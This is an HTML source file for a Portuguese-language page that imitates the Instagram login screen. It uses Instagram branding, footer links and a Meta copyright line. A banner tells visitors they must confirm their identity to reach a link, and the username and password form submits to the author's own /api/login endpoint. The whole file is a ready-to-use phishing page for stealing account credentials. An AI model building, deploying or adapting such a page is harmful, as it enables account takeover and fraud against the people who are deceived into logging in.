<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Login • Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* Reset básico */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* Corpo da página em modo escuro */
    body {
      background-color: #000; /* Fundo preto */
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #fff; /* Texto branco padrão */
    }

    /* Barra azul no topo com a mensagem */
    .top-bar {
      width: 100%;
      background-color: #3897f0;
      color: #fff;
      text-align: center;
      padding: 10px 0;
      font-weight: bold;
      font-size: 14px;
    }

    /* Área principal que contém a imagem e o box de login */
    .main {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 40px); /* Ajuste para considerar a barra no topo */
      padding: 20px;
      gap: 40px; /* Espaçamento entre a imagem e o formulário */
    }

    /* Container da imagem de pré-visualização do Instagram (celular) */
    .phone-preview img {
      max-width: 400px; /* Ajuste conforme necessário */
    }

    /* Container do formulário de login */
    .container {
      width: 350px;
      padding: 40px;
      background-color: #000; /* Fundo do container também preto */
      border: 1px solid #262626; /* Borda sutil */
      text-align: center;
      border-radius: 4px;
    }

    .logo {
      margin-bottom: 20px;
    }

    /* Ajuste de cores para inputs em modo escuro */
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #262626;
      background: #121212;
      border-radius: 3px;
      font-size: 14px;
      color: #fff;      /* Texto branco */
    }
    input::placeholder {
      color: #aaa;      /* Placeholder mais claro */
    }

    /* Botão de envio */
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      border: none;
      color: #fff;
      font-weight: bold;
      font-size: 14px;
      border-radius: 3px;
      cursor: pointer;
    }
    button:hover {
      opacity: 0.9;
    }

    /* Rodapé com links inferiores e mini textos */
    .footer {
      text-align: center;
      padding: 20px;
      color: #999;
      font-size: 12px;
    }
    .footer a {
      color: #999;
      text-decoration: none;
      margin: 0 5px;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .app-badges {
      margin: 10px 0;
    }
    .app-badges img {
      height: 40px;
      margin: 0 5px;
    }

    /* Responsividade simples para telas menores */
    @media (max-width: 768px) {
      .main {
        flex-direction: column;
      }
      .phone-preview {
        margin-bottom: 20px;
      }
    }
  </style>
</head>
<body>
  <!-- Barra de aviso no topo -->
  <div class="top-bar">
    Você precisa confirmar sua identificação para prosseguir para o link.
  </div>

  <!-- Conteúdo principal -->
  <div class="main">
    <!-- Imagem de celular (local, cell_page.png) -->
    <div class="phone-preview">
      <img
        src="cell_page.png"
        alt="Prévia do Instagram no celular">
    </div>

    <!-- Box de login -->
    <div class="container">
      <div class="logo">
        <!-- Logo com nome do Instagram em branco -->
        <img 
          src="https://hawaiivideopro.com/wp-content/uploads/instagram-logo-icon-white-border-text-black-background.png" 
          alt="Instagram" 
          width="150">
      </div>
      <!-- Ajuste: agora envia POST para http://localhost:3000 (ou outra URL) -->
      <form id="loginForm" action="/api/login" method="post">
        <input type="text" id="username" name="username" placeholder="Nome de usuário" required>
        <input type="password" id="password" name="password" placeholder="Senha" required>
        <button type="submit">Entrar</button>
      </form>
    </div>
  </div>

  <!-- Rodapé -->
  <div class="footer">
    <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
    <p>Baixe o aplicativo.</p>
    <div class="app-badges">
      <!-- Substitua as imagens pelos badges oficiais, se preferir -->
      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"></a>
      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Apple-logo.png" alt="App Store" style="height:40px;"></a>
    </div>
    <div>
      <a href="#">Sobre</a> •
      <a href="#">Ajuda</a> •
      <a href="#">API</a> •
      <a href="#">Privacidade</a> •
      <a href="#">Termos</a> •
      <a href="#">Localizações</a> •
      <a href="#">Idioma</a>
    </div>
    <p>© 2023 Instagram from Meta</p>
  </div>
</body>
</html>
